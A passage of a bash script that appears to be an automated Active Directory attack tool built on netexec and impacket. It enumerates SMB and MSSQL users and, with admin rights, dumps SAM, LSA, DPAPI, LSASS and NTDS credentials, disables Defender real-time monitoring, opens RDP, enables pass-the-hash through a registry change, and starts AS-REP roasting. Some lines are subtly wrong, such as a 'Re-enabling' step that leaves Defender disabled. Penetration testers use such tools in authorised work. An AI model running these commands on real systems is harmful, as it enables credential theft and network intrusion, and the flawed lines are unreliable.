				${proxychains} netexec --timeout ${CME_TIMEOUT} mssql ${ip} -u ${Username} ${cme_creds} < /dev/null > ${DIR_VULNS}/mssql/cme_${ip}_basic 2>/dev/null
				if grep -Eqo "STATUS_NOT_SUPPORTED" "${DIR_VULNS}/mssql/cme_${ip}_basic" || grep -Eqo "Failed to authenticate the user .* with ntlm" "${DIR_VULNS}/mssql/cme_${ip}_basic"; then
					#If NTLM is not supported, restart with kerberos
					hostname=$(grep -E "^${ip}:" ${ROOT_PATH}/hostname_file.txt | awk -F ":" '{print $2}')
					if [[ -n "${hostname}" ]];then
						kerberos="-d $(echo "${hostname}" | cut -d '.' -f 2-) --kerberos"
						host="${hostname}"
					else
						kerberos=""
						host="${ip}"
					fi
					${proxychains} netexec mssql $host -u "${Username}" ${cme_creds} ${kerberos} < /dev/null > ${DIR_VULNS}/mssql/cme_${ip}_basic 2>/dev/null
				fi
				# is user ?
				if grep -aq '\[+\]' ${DIR_VULNS}/mssql/cme_${ip}_basic; then
					green_log "${SPACE}${SPACE}[💀] ${Username} is a valid username ${ip} (${hostname})"
					# is admin ?
					if grep -aq '(Pwn3d!)' ${DIR_VULNS}/mssql/cme_${ip}_basic; then
						red_log "${SPACE}${SPACE}[💀] ${Username} have admin rights on MSSQL DB ${ip} (${hostname}) !"
					fi
					#Can impersonate ? https://seguridadpy.info/2024/08/mssql-for-pentester-netexec/
					${proxychains} netexec mssql $host -u "${Username}" ${cme_creds} ${kerberos} -M mssql_priv < /dev/null > ${DIR_VULNS}/mssql/cme_${ip}_mssql_priv 2>/dev/null
					if grep -aq 'can impersonate' ${DIR_VULNS}/mssql/cme_${ip}_mssql_priv; then
						red_log "${SPACE}${SPACE}[💀] ${Username} can impersonate user on MSSQL DB ${ip} (${hostname}) !"
						blue_log "${SPACE}${SPACE} [+] ${proxychains} netexec mssql $host -u "${Username}" ${cme_creds} ${kerberos} -M mssql_priv -o ACTION=privesc  / 'rollback' to reverse the impersonation"
					fi
				fi
			fi
		done
	fi
}

########################### SCAN SMB ###############################
smb () {
	if [[ -e "${DIR_PORTS}/445.txt" ]]; then
		mkdir ${DIR_VULNS}/smb 2>/dev/null
		log "[🔍] Check SMB"
		SMB=$(cat ${DIR_PORTS}/445.txt)
		for ip in $SMB;	do
			if control_ip_attack; then
				hostname=$(grep -E "^${ip}:" ${ROOT_PATH}/hostname_file.txt | awk -F ":" '{print $2}')
				log "${SPACE}[📂] Checking ${ip} (${hostname}) ..."

				#Anonymous / null session is allowed ?
				${proxychains} netexec --timeout 30 smb ${ip} -u '' -p '' --shares > ${DIR_VULNS}/smb/cme_${ip}_null_session_shares 2>/dev/null
				${proxychains} netexec --timeout 30 smb ${ip} -u '' -p '' --users > ${DIR_VULNS}/smb/cme_${ip}_null_session_users 2>/dev/null
				if (grep -aq '\[+\]' "${DIR_VULNS}/smb/cme_${ip}_null_session_shares" && ! grep -aq "STATUS_ACCESS_DENIED" "${DIR_VULNS}/smb/cme_${ip}_null_session_shares") || grep -aiq 'BadPW' "${DIR_VULNS}/smb/cme_${ip}_null_session_users"; then
					green_log "${SPACE}${SPACE}[💀] Null session (anonymous) allowed"
					if grep -qaE 'READ|WRITE' "${DIR_VULNS}/smb/cme_${ip}_null_session_shares"; then
						green_log "${SPACE}${SPACE}[💀] Shares found -> ${DIR_VULNS}/smb/cme_${ip}_null_session_shares"
						blue_log "${SPACE}${SPACE} [+] ${proxychains} smbmap -H ${ip} -r --depth 3 --exclude IPC$"
					fi
					
					cat ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute |grep -ai 'SidTypeUser' |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  \
							sed 's/.*\\//' | awk '{print $1}' | tee -a ${DIR_VULNS}/smb/cme_${ip}_local_users.txt ${ROOT_PATH}/users.txt
					if [[ $(wc -l < "${DIR_VULNS}/smb/cme_${ip}_local_users.txt") -gt 0 ]]; then
						green_log "${SPACE}${SPACE}[💀] New local users found -> ${DIR_VULNS}/smb/cme_${ip}_local_users.txt AND ${ROOT_PATH}/users.txt"
					fi
					
					cat ${DIR_VULNS}/smb/cme_${ip}_null_session_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' | \
							sed 's/.*\\//' |awk '{desc=""; for (i=4; i<=NF; i++) desc=desc " " $i; print $1 ":" desc}' | \
							awk '{desc=""; for (i=3; i<=NF; i++) desc=desc " " $i; if ($2 ~ /^[0-9]+$/) print $1 ":" desc; else print $1 ": " $2 desc}'| \
							column -t -s ':' | tee -a ${ROOT_PATH}/users_with_descriptions.txt ${DIR_VULNS}/smb/cme_${ip}_users.txt
					cat ${DIR_VULNS}/smb/cme_${ip}_null_session_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  \
							sed 's/.*\\//' | awk '{print $1}' >> ${ROOT_PATH}/users.txt				
					## Supprimer les doublons
					sort -u ${ROOT_PATH}/users.txt -o ${ROOT_PATH}/users.txt
					sort -u ${ROOT_PATH}/users_with_descriptions.txt -o ${ROOT_PATH}/users_with_descriptions.txt
					sort -u ${DIR_VULNS}/smb/cme_${ip}_users.txt -o ${DIR_VULNS}/smb/cme_${ip}_users.txt
					check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_null_session_users ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute |grep -av '\[.\]' | grep -v "\-BadPW\-" | \
							awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  sed 's/.*\\//' | awk '{print $1}' | wc -l)
					if [[ "$check_smb" -gt 0 ]] && ! grep -iq "Exception" ${DIR_VULNS}/smb/cme_${ip}_null_session_users ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute; then
						green_log "${SPACE}${SPACE}[💀] New users found -> ${ROOT_PATH}/users_with_descriptions.txt AND ${ROOT_PATH}/users.txt"
					fi
				fi
				# Guest session allowed ?
				${proxychains} netexec --timeout ${CME_TIMEOUT} smb ${ip} -u 'GuestUser' -p '' --shares < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_guest_shares 2>/dev/null
				if grep -aq '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_guest_shares; then
					green_log "${SPACE}${SPACE}[💀] Guest session allowed"
					
					if grep -qaE 'READ|WRITE' "${DIR_VULNS}/smb/cme_${ip}_guest_shares"; then
						green_log "${SPACE}${SPACE}[💀] Shares found -> ${DIR_VULNS}/smb/cme_${ip}_guest_shares"
						blue_log "${SPACE}${SPACE} [+] ${proxychains} smbmap -H ${ip} -p 'GuestUser' -p '' -r --depth 3 --exclude IPC$"
					fi
					
					${proxychains} netexec --timeout ${CME_TIMEOUT} smb ${ip} -u 'GuestUser' -p '' --rid-brute 2000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute 2>/dev/null
					cat ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute |grep -ai 'SidTypeUser' |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  \
							sed 's/.*\\//' | awk '{print $1}' | tee -a ${DIR_VULNS}/smb/cme_${ip}_users.txt ${ROOT_PATH}/users.txt 
					
					${proxychains} netexec --timeout ${CME_TIMEOUT} smb ${ip} -u 'GuestUser' -p '' --users < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_guest_users 2>/dev/null
					cat ${DIR_VULNS}/smb/cme_${ip}_guest_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' | \
							sed 's/.*\\//' |awk '{desc=""; for (i=4; i<=NF; i++) desc=desc " " $i; print $1 ":" desc}' | \
							awk '{desc=""; for (i=3; i<=NF; i++) desc=desc " " $i; if ($2 ~ /^[0-9]+$/) print $1 ":" desc; else print $1 ": " $2 desc}'| \
							column -t -s ':' | tee -a ${ROOT_PATH}/users_with_descriptions.txt ${DIR_VULNS}/smb/cme_${ip}_users.txt
					cat ${DIR_VULNS}/smb/cme_${ip}_guest_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  \
							sed 's/.*\\//' | awk '{print $1}' >> ${ROOT_PATH}/users.txt
					
					## Supprimer les doublons
					sort -u ${ROOT_PATH}/users.txt -o ${ROOT_PATH}/users.txt
					sort -u ${ROOT_PATH}/users_with_descriptions.txt -o ${ROOT_PATH}/users_with_descriptions.txt
					sort -u ${DIR_VULNS}/smb/cme_${ip}_users.txt -o ${DIR_VULNS}/smb/cme_${ip}_users.txt
					check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_guest_users ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute |grep -av '\[.\]' | grep -v "\-BadPW\-" | \
							awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  sed 's/.*\\//' | awk '{print $1}' | wc -l)
					if [[ "$check_smb" -gt 0 ]] && ! grep -iq "Exception" ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute ${DIR_VULNS}/smb/cme_${ip}_guest_users; then
						green_log "${SPACE}${SPACE}[💀] New users found -> ${DIR_VULNS}/smb/cme_${ip}_users.txt AND ${ROOT_PATH}/users.txt"
					fi
				fi
				# Can i connect with input user ?
				if [[ "${Username}" != "anonymous" ]]; then
					${proxychains} netexec --timeout ${CME_TIMEOUT} smb ${ip} -u ${Username} ${cme_creds} < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_basic_${Username} 2>/dev/null
					if grep -Eqo "STATUS_NOT_SUPPORTED" "${DIR_VULNS}/smb/cme_${ip}_basic_${Username}" || grep -Eqo "Failed to authenticate the user .* with ntlm" "${DIR_VULNS}/smb/cme_${ip}_basic_${Username}"; then
						#If NTLM is not supported, restart with kerberos
						if [[ -n "${hostname}" ]];then
							kerberos="-d $(echo "${hostname}" | cut -d '.' -f 2-) --kerberos"
							host="${hostname}"
						fi
						${proxychains} netexec smb $host -u "${Username}" ${cme_creds} ${kerberos} < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_basic_${Username} 2>/dev/null
					else
						kerberos=""
						host="${ip}"
					fi
				fi
				#Can we connect to at least one share ?
				if grep -aqs '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_basic_${Username} || grep -aqs '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_guest || grep -aqs 'SidTypeUser' ${DIR_VULNS}/smb/cme_${ip}_null_session; then
					if [[ "${Username}" != "anonymous" ]]; then
						green_log "${SPACE}${SPACE}[💀] ${Username} is a valid username"
					fi
					can_connect="1"
				else
					can_connect="0"
				fi
				#Are we machine's admin
				if grep -aqs '(Pwn3d!)' ${DIR_VULNS}/smb/cme_${ip}_basic_${Username}; then
					red_log "${SPACE}${SPACE}[💀] ${Username} have admin rights ! -> impacket-smbexec to exploit"
					admin="1"
				else
					admin="0"
				fi
				
				if [ "$can_connect" = "1" ]; then
					#List available shares
					${proxychains} netexec smb $host -u "${Username}" ${cme_creds} ${kerberos} --shares < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_basic_share_${Username} 2>/dev/null
					if grep -qaE 'READ|WRITE' "${DIR_VULNS}/smb/cme_${ip}_basic_share_${Username}"; then
						green_log "${SPACE}${SPACE}[💀] Shares found -> ${DIR_VULNS}/smb/cme_${ip}_basic_share_${Username}"
						if [[ -n "${Password}" ]]; then
							blue_log "${SPACE}${SPACE} [+] ${proxychains} smbmap -H ${ip} -r --depth 3 -u '${Username}' -p '${Password}' --exclude IPC$"
						elif [[ -n "$NT_Hash" ]]; then
							blue_log "${SPACE}${SPACE} [+] ${proxychains} smbmap -H ${ip} -r --depth 3 -u '${Username}' -p 'aad3b435b51404eeaad3b435b51404ee:${NT_Hash}' --exclude IPC$"
						fi
					fi
					
					###### RETRIEVE POLICY PASSWORD ######
					${proxychains} netexec smb $host -u "${Username}" ${cme_creds} ${kerberos} --pass-pol < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_pass_pol 2>/dev/null
					check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_pass_pol | wc -l)
					if [ "$check_smb" -gt 1 ]; then
						green_log "${SPACE}${SPACE}[💀] Password Policy found -> ${DIR_VULNS}/smb/cme_${ip}_pass_pol"
					fi
					
					###### RETRIEVE USERS ######
						#'< /dev/null' avoid netexec to break the loop, weird behavior ..
					${proxychains} netexec smb $host -u "${Username}" ${cme_creds} ${kerberos} --rid-brute 10000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_rid_brute 2>/dev/null
					grep -i 'SidTypeUser' ${DIR_VULNS}/smb/cme_${ip}_rid_brute| grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${ROOT_PATH}/users.txt
					sort -u ${ROOT_PATH}/users.txt -o ${ROOT_PATH}/users.txt
					if grep -qs "SidTypeUser" ${DIR_VULNS}/smb/cme_${ip}_rid_brute; then
						green_log "${SPACE}${SPACE}[💀] New users found (via RID_brute) -> ${DIR_VULNS}/smb/cme_${ip}_rid_brute"
						## Supprimer les doublons
						sort -u ${ROOT_PATH}/users.txt -o ${ROOT_PATH}/users.txt
					fi
					${proxychains} netexec smb ${host} -u "${Username}" ${cme_creds} ${kerberos} --users < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_users 2>/dev/null
					check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_users | wc -l)
					if [[ "$check_smb" -gt 4 ]]; then
						green_log "${SPACE}${SPACE}[💀] New users found -> ${ROOT_PATH}/users_with_descriptions.txt AND ${ROOT_PATH}/users.txt"

						## Injecter ces utilisateurs dans un fichier
						cat ${DIR_VULNS}/smb/cme_${ip}_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' | \
								sed 's/.*\\//' |awk '{desc=""; for (i=4; i<=NF; i++) desc=desc " " $i; print $1 ":" desc}' | \
								awk '{desc=""; for (i=3; i<=NF; i++) desc=desc " " $i; if ($2 ~ /^[0-9]+$/) print $1 ":" desc; else print $1 ": " $2 desc}'| \
								column -t -s ':' >> ${ROOT_PATH}/users_with_descriptions.txt
						cat ${DIR_VULNS}/smb/cme_${ip}_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  \
								sed 's/.*\\//' | awk '{print $1}' >> ${ROOT_PATH}/users.txt
						## Supprimer les doublons
						sort -u ${ROOT_PATH}/users.txt -o ${ROOT_PATH}/users.txt
						sort -u ${ROOT_PATH}/users_with_descriptions.txt -o ${ROOT_PATH}/users_with_descriptions.txt
					fi
					
					if [ "$admin" = "1" ] && [ "$soft" = "false" ]; then
						###### DUMP SAM ######
						${proxychains} netexec smb ${host} -u "${Username}" ${cme_creds} ${kerberos} --sam < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_sam 2>/dev/null
						check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_sam | wc -l)
						
						if [ "$check_smb" -gt 1 ]; then
							green_log "${SPACE}${SPACE}[💀] Success dump SAM -> ${DIR_VULNS}/smb/cme_${ip}_sam"
						fi
						
						###### DUMP LSA ######
						${proxychains} netexec smb $host -u "${Username}" ${cme_creds} ${kerberos} --lsa < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_lsa 2>/dev/null
						check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_lsa | wc -l)
						
						if [ "$check_smb" -gt 1 ]; then
							green_log "${SPACE}${SPACE}[💀] Success dump LSA -> ${DIR_VULNS}/smb/cme_${ip}_lsa"
						fi
						
						###### DUMP DPAPI ######
						${proxychains} netexec smb $host -u "${Username}" ${cme_creds} ${kerberos} --dpapi < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_dpapi 2>/dev/null
						check_smb=$(grep -oa 'Looting secrets' ${DIR_VULNS}/smb/cme_${ip}_dpapi | wc -l)

						if [ "$check_smb" -gt 0 ] && ! grep -q "No secrets found" ${DIR_VULNS}/smb/cme_${ip}_dpapi; then
							green_log "${SPACE}${SPACE}[💀] Success dump DPAPI -> ${DIR_VULNS}/smb/cme_${ip}_dpapi"
						fi
						##### IMPERSONATE #####
						${proxychains} netexec smb $host -u "${Username}" ${cme_creds} ${kerberos} -M impersonate < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_impersonate 2>/dev/null
						check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_impersonate | wc -l)
						
						if [ "$check_smb" -gt 1 ]; then
							green_log "${SPACE}${SPACE}[💀] Success impersonnate -> ${DIR_VULNS}/smb/cme_${ip}_impersonate"
							blue_log "${SPACE}${SPACE} [+] Possibility to exploit via : ${proxychains} netexec smb $host -u "${Username}" ${cme_creds} ${kerberos} -M impersonate -o TOKEN=1 EXEC='whoami'"
						fi
						
						###### COMMAND EXECUTION ######
						${proxychains} netexec smb $host -u "${Username}" ${cme_creds} ${kerberos} -x "whoami" < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_cmd 2>/dev/null
						check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_cmd | wc -l)
						
						if [ "$check_smb" -gt 1 ]; then
							green_log "${SPACE}${SPACE}[💀] Success command execution"
							
							#Disabling RealTimeMonitoring
							${proxychains} netexec smb $host -u "${Username}" ${cme_creds} ${kerberos} -x 'powershell Set-MpPreference -DisableRealTimeMonitoring $true' < /dev/null > /dev/null 2>/dev/null
							
							#### Extract LSSAS only on VM that are not DC - to avoid possible crash ..
							if [ $(cat ${DIR_PORTS}/88.txt | grep -aqi "${ip}"; echo $?) -eq 1 ]; then
								###### DUMP LSASS ######
								${proxychains} netexec smb $host -u "${Username}" ${cme_creds} ${kerberos} -M lsassy < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_lsass 2>/dev/null
								check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_lsass | wc -l)

								if [[ "$check_smb" -gt 0 ]] && ! grep -q "No credentials found" "${DIR_VULNS}/smb/cme_${ip}_lsass"; then
									green_log "${SPACE}${SPACE}[💀] Success dump LSASS.EXE -> ${DIR_VULNS}/smb/cme_${ip}_lsass"
								fi
							else
								##### NTDS extract #####
								${proxychains} netexec smb $host -u "${Username}" ${cme_creds} ${kerberos} --ntds < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_ntds 2>/dev/null
								check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_ntds | wc -l)
								
								if [ "$check_smb" -gt 1 ]; then
									green_log "${SPACE}${SPACE}[💀] Success dump NTDS -> ${DIR_VULNS}/smb/cme_${ip}_ntds"
								fi
							fi
							
							#Check for disconnected RDP sessions
							${proxychains} netexec smb $host -u "${Username}" ${cme_creds} ${kerberos} -x 'query user' < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp 2>/dev/null
							check_smb=$(grep -aEi 'Déco|Deco|Dis' ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp | wc -l)
							if [ "$check_smb" -gt 0 ]; then
								green_log "${SPACE}${SPACE}[💀] Found RDP session disconnected -> ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp"
							fi
							#If RDP is not enabled
							if ! grep -q "${ip}" ${DIR_PORTS}/3389.txt;then 
								#Enable RDP in registry
								${proxychains} netexec smb ${host} -u "${Username}" ${cme_creds} ${kerberos} -x 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f' < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_enabling_rdp 2>/dev/null
								#Allow RDP connexion on the machine
								${proxychains} netexec smb ${host} -u "${Username}" ${cme_creds} ${kerberos} -x 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes' < /dev/null >> ${DIR_VULNS}/smb/cme_${ip}_enabling_rdp 2>/dev/null
								actual_modification="${proxychains} netexec smb ${host} -u "${Username}" ${cme_creds} ${kerberos} -x 'netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes'"
								future_modification="${proxychains} netexec smb ${host} -u "${Username}" ${cme_creds} ${kerberos} -x 'netsh advfirewall firewall set rule group=\"remote desktop\" new enable=No'"
								if ! grep -i 'Ok.' ${DIR_VULNS}/smb/cme_${ip}_enabling_rdp; then
									${proxychains} netexec smb ${host} -u "${Username}" ${cme_creds} ${kerberos} -x 'netsh advfirewall firewall set rule group="Bureau à distance" new enable=Yes' < /dev/null >> ${DIR_VULNS}/smb/cme_${ip}_enabling_rdp 2>/dev/null
									#overwrite the $actual_modification and $future_modification variables if necessary
									actual_modification="${proxychains} netexec smb ${host} -u "${Username}" ${cme_creds} ${kerberos} -x 'netsh advfirewall firewall set rule group=\"Bureau à distance\" new enable=Yes'"
									future_modification="${proxychains} netexec smb ${host} -u "${Username}" ${cme_creds} ${kerberos} -x 'netsh advfirewall firewall set rule group=\"Bureau à distance\" new enable=No'"
								fi
								#Restart RDP service on the machine
								${proxychains} netexec smb ${host} -u "${Username}" ${cme_creds} ${kerberos} -x 'powershell Restart-Service -Force -Name "TermService"' < /dev/null >> ${DIR_VULNS}/smb/cme_${ip}_enabling_rdp 2>/dev/null
								#Check the RDP service
								${proxychains} netexec smb ${host} -u "${Username}" ${cme_creds} ${kerberos} -x 'powershell Get-Service -Name "TermService"' < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_status_post_enabling_rdp 2>/dev/null
								if grep -qi 'Running' ${DIR_VULNS}/smb/cme_${ip}_status_post_enabling_rdp;then
									orange_log "${SPACE}${SPACE}[💀] RDP is now activate (it wasn't) on $host (${ip}) -> Changement added in ${ROOT_PATH}/modifs.txt"
									 echo -e "\nACTION : Enabling RDP on $host (${ip}" >> ${ROOT_PATH}/modifs.txt
									 echo "${proxychains} netexec smb ${host} -u "${Username}" ${cme_creds} ${kerberos} -x 'reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f'" >> ${ROOT_PATH}/modifs.txt
									 echo "$actual_modification" >> ${ROOT_PATH}/modifs.txt
									 echo "${proxychains} netexec smb ${host} -u "${Username}" ${cme_creds} ${kerberos} -x 'powershell Restart-Service -Force -Name \"TermService\"'" >> ${ROOT_PATH}/modifs.txt
									 echo "${proxychains} netexec smb ${host} -u "${Username}" ${cme_creds} ${kerberos} -x 'powershell Get-Service -Name \"TermService\"'" >> ${ROOT_PATH}/modifs.txt
									 echo "CORRECTION ->" >> ${ROOT_PATH}/modifs.txt
									 echo "${proxychains} netexec smb ${host} -u "${Username}" ${cme_creds} ${kerberos} -x 'reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f'" | tee -a ${ROOT_PATH}/modifs.txt ${ROOT_PATH}/modifs_automation.txt > /dev/null
									 echo "$future_modification" | tee -a ${ROOT_PATH}/modifs.txt ${ROOT_PATH}/modifs_automation.txt > /dev/null
									 echo "${proxychains} netexec smb ${host} -u "${Username}" ${cme_creds} ${kerberos} -x 'powershell Stop-Service -Force -Name \"TermService\"'" | tee -a ${ROOT_PATH}/modifs.txt ${ROOT_PATH}/modifs_automation.txt > /dev/null
									 echo "${proxychains} netexec smb ${host} -u "${Username}" ${cme_creds} ${kerberos} -x 'powershell Get-Service -Name \"TermService\"'" | tee -a ${ROOT_PATH}/modifs.txt ${ROOT_PATH}/modifs_automation.txt > /dev/null
									 echo "${ip}" >> ${DIR_PORTS}/3389.txt
								else
									rm ${DIR_VULNS}/smb/cme_${ip}_status_post_enabling_rdp
								fi
							fi
							###### RESTRICTED ADMIN #####
							# Will permit to connect with NTLM Hash
							${proxychains} timeout ${CME_TIMEOUT} netexec smb ${host} -u "${Username}" ${cme_creds} ${kerberos} -x 'reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin' < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp_restricted 2>/dev/null
							
							check_smb=$(grep -aEi '0x0' ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp_restricted | wc -l)
							if [ "$check_smb" -gt 0 ]; then
								red_log "${SPACE}[!] Pass-The-Hash already allowed for RDP ! -> Possible old compromission"
								rm ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp_restricted
							else
								${proxychains} netexec smb ${host} -u "${Username}" ${cme_creds} ${kerberos} -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x1 /f'  < /dev/null ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp_restricted 2>/dev/null
								orange_log "${SPACE}${SPACE}[💀] New possibility to Pass-The-Hash enabled on RDP -> Changement added in ${ROOT_PATH}/modifs.txt"
								echo -e "\nACTION :" >> ${ROOT_PATH}/modifs.txt
								echo "${proxychains} netexec smb ${host} -u "${Username}" ${cme_creds} ${kerberos} -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'" >> ${ROOT_PATH}/modifs.txt
								echo "CORRECTION ->" >> ${ROOT_PATH}/modifs.txt
								echo "${proxychains} netexec smb ${host} -u "${Username}" ${cme_creds} ${kerberos} -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x1 /f'" | tee -a ${ROOT_PATH}/modifs.txt ${ROOT_PATH}/modifs_automation.txt > /dev/null
							fi
							
							#Re-enabling RealTimeMonitoring
							${proxychains} netexec smb $host -u "${Username}" ${cme_creds} ${kerberos} -x 'powershell Set-MpPreference -DisableRealTimeMonitoring $true' < /dev/null
							
						fi
					fi
				fi
			fi
		done
	fi
}

bloodhound () {
	if [[ -e "${DIR_PORTS}/88.txt" ]]; then
		mkdir ${ROOT_PATH}/bloodhound 2>/dev/null
		DC_ip=$(cat "${DIR_PORTS}/88.txt" | head -n 1)
		hostname=$(grep -E "^$DC_ip:" ${ROOT_PATH}/hostname_file.txt | awk -F ":" '{print $2}')
		DC_host="${hostname}"
		domain=$(echo "${hostname}" | cut -d '.' -f 2-)
		log "[🔍] BloodHound CE collection ..."
		if [[ "${Username}" != "anonymous" ]]; then
			if [ -n "$NT_Hash" ]; then
				${proxychains} bloodhound-ce-python --zip -c All -d ${domain} -u ${Username} -hashes ":${NT_Hash}" -dc ${DC_host} -o "${ROOT_PATH}/bloodhound/" > /dev/null 2>&1
			else
				${proxychains} bloodhound-ce-python --zip -c All -d ${domain} -u ${Username} -p ${Password} -dc ${DC_host} -o "${ROOT_PATH}/bloodhound/" > /dev/null 2>&1
			fi
		fi
		recent_file=$(find "${ROOT_PATH}/bloodhound" -maxdepth 1 -name '*bloodhound.zip' -type f -newermt '5 seconds ago')
		if [ -n "${recent_file}" ]; then
			blue_log "${SPACE}[+] A new BloodHound CE collection is available: ${recent_file}"
		fi
	fi
}

users () {
	if [[ -e "${DIR_PORTS}/88.txt" ]]; then
		DC_ip=$(cat "${DIR_PORTS}/88.txt" | head -n 1)
		hostname=$(grep -E "^$DC_ip:" ${ROOT_PATH}/hostname_file.txt | awk -F ":" '{print $2}')
		DC_host="${hostname}"
		domain=$(echo "${hostname}" | cut -d '.' -f 2-)
		log "[🔍] Extracting AD users ..."
		if [[ "${Username}" != "anonymous" ]]; then
			if [ -n "$NT_Hash" ]; then
				${proxychains} impacket-getTGT -hashes ":${NT_Hash}" $domain/${Username} -dc-ip ${DC_host} > /dev/null 2>&1
			else
				${proxychains} impacket-getTGT $domain/${Username}:${Password} -dc-ip ${DC_host} > /dev/null 2>&1
			fi
		fi
		if [[ -e "${Username}.ccache" ]]; then
			export KRB5CCNAME=${Username}.ccache
			AD_Users=$(${proxychains} impacket-GetADUsers $domain/${Username} -no-pass -dc-host ${DC_host} -k -all | awk -F " " '{print $1}' | sed '1,6d')
			unset KRB5CCNAME
			rm ${Username}.ccache
			if [[ -n "$AD_Users" ]]; then
				green_log "${SPACE}[💀] Great, successful extraction -> ${ROOT_PATH}/users.txt"
				echo "$AD_Users" >> ${ROOT_PATH}/users.txt
				sort -u ${ROOT_PATH}/users.txt -o ${ROOT_PATH}/users.txt
			fi
		fi
	fi
}

########################### 	Kerberos    ###############################
asp (){
	if [[ -e "${DIR_PORTS}/88.txt" ]]; then
		DC_ip=$(cat "${DIR_PORTS}/88.txt" | head -n 1)
		hostname=$(grep -E "^$DC_ip:" ${ROOT_PATH}/hostname_file.txt | awk -F ":" '{print $2}')
		DC_host="${hostname}"
		domain=$(echo "${hostname}" | cut -d '.' -f 2-)
		mkdir ${DIR_VULNS}/krb  2>/dev/null
		log "[🔍] Starting asreproasting attack ..."
		if [[ "${Username}" != "anonymous" ]]; then
			if [ -n "$NT_Hash" ]; then
				${proxychains} impacket-getTGT -hashes ":${NT_Hash}" $domain/${Username} -dc-ip ${DC_host} > /dev/null 2>&1
			else
				${proxychains} impacket-getTGT $domain/${Username}:${Password} -dc-ip ${DC_host} > /dev/null 2>&1
			fi
		fi
		if [[ -e "${Username}.ccache" ]]; then
			export KRB5CCNAME=${Username}.ccache
			${proxychains} impacket-GetNPUsers $domain/${Username} -no-pass -dc-host ${DC_host} -k -request -outputfile ${DIR_VULNS}/krb/asreproasting_Users.txt > /dev/null 2>&1
			unset KRB5CCNAME
			rm ${Username}.ccache
		else
